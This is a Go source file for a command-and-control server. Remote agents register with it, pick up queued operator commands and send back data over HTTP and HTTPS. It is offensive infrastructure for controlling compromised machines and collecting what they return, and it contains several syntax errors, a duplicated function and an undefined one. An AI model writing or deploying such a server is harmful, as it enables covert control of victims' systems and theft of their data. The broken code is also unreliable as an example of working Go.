package listener

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"sync"
	"time"
)

// Agent represents a connected agent
type Agent struct {
	ID			string
	LastCheck	time.TimeCommands
	Commands	[]string
	Mutex		sync.Mutex
}

// AgentManager handles all connected agents
type AgentManager struct {
	Agents map[string]*Agent
	Mutex  sync.Mutex
}

// Global agent manager
var agentManager = AgentManager{
	Agents: make(map[string]*Agent)
}

// handleAgentRegistration handles the initial registration of an agent 
func handleAgentRegistration(w http.ResponseWriter, r *http.Request) {
	// Extract agent ID from the request
	agentID := r.Header.Get("Agent-ID")
	if agentID == "" {
		http.Error(w, "Agent-ID missing", http.StatusBadRequest)
		return
	}

	agentManager.Mutex.Lock()
	defer agentManager.Mutex.Unlock()

	// Register new agent if it doesn't exist
	if _, exists := agentManager.Agents[agentID]; !exists {
		agentManager.Agents[agentID] = &Agent{
			ID:			agentID,
			LastCheck:	time.Now(),
			Commands:	[]string{},
		}
		log.Printf("Registered new agent: %s", agentID)
	}

	// Send success response
	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, "Registered")
}

// handleCommandRequest handles the agent requesting commands 
func handleCommandRequest(w, http.ResponseWriter, r *http.Request) {
	agentID := r.Header.Get("Agent-ID")
	if agentID == "" {
		http.Error(w, "Agent-ID missing", http.StatusBadRequest)
		return
	}

	agentManager.Mutex.Lock()
	agent, exists := agentManager.Agents[agentID]
	agentManager.Mutex.Unlock()

	if !exists {
		http.Error(w, "Agent not registered", http.StatusNotFound)
		return
	}

	// Lock the agent's command list and retrieve commands
	agent.Mutex.Lock()
	commands := agent.Commands
	agent.Commands = []string{} // Clear the command que after retrieval
	agent.Mutex.Unlock()

	// Respond with commands in JSON format
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(commands)
}

// handleDataSubmission handles data sent by the agent
func handleDataSubmission(w http.ResponseWriter, r *http.Request) {
	agentID := r.Header.Get("Agent-ID")
	if agentID == "" {
		http.Error(w, "Agent-ID missing", http.StatusBadRequest)
		return
	}

	agentManager.Mutex.Lock()
	agent, exists := agentManager.Agents[agentID]
	agentManager.Mutex.Unlock()

	if !exists {
		http.Error(w, "Agent not registered", http.StatusNotFound)
		return
	}

	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Cannot read body", http.StatusBadRequest)
		return
	}

	log.Printf("Received data from agent %s: %s", agentID, string(body))

	// Send success response
	w.WriteHeader(http.StatusOK)
	fmt.Fprintln(w, "Data received")
}

// enqueCommand allows the operator to add a command to the agent's queue
func enqueCommand(agentID string, command string) {
	agentManager.Mutex.Lock()
	agent, exists :-= agentManager.Agents[agentID]
	agentManager.Mutex.Unlock()

	if exists {
		agent.Mutex.Lock()
		agent.Commands = append(agent.Commands, command)
		agent.Mutex.Unlock()
		log.Printf("Enqueued command for agent %s: %s", agentID, command)
	} else {
		log.Printf("Failed to enqueue command: Agent %s not found", agentID)
	}
}

// startHTTPServer starts the HTTP server
func startHTTPServer() {
	httpServer := &http.Server{
		Addr: ":7777",
	}

	log.Println("C2 HTTP server listening on port 7777...")
	err := httpServer.ListenAndServe()
	if err != nil {
		log.Fatalf("HTTP server failed to start: %v", err)
	}
}

// startHTTPSServer starts the HTTPS server
func startHTTPServer() {
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}
	httpsServer:= &http.Server{
		Addr: 		":8888",
		TLSConfig: 	tlsConfig,
	}

	log.Println("C2 HTTPS server listening on port 8888 (TLS)...")
	err := httpsServer.ListenAndServeTLS("server.crt", "server.key")
	if err != nil {
		log.Fatalf("HTTPS server failed to start: %v", err)
	}
}

func main() {
	// Register handlers
	http.HandleFunc("/register", handleAgentRegistration)
	http.HandleFunc("/commands", handleCommandRequest)
	http.HandleFunc("/data", handleDataSubmission)

	// Start HTTP and HTTPS servers concurrently
	go startHTTPServer()
	go startHTTPSServer()

	// Keep the main function running
	select {}
}
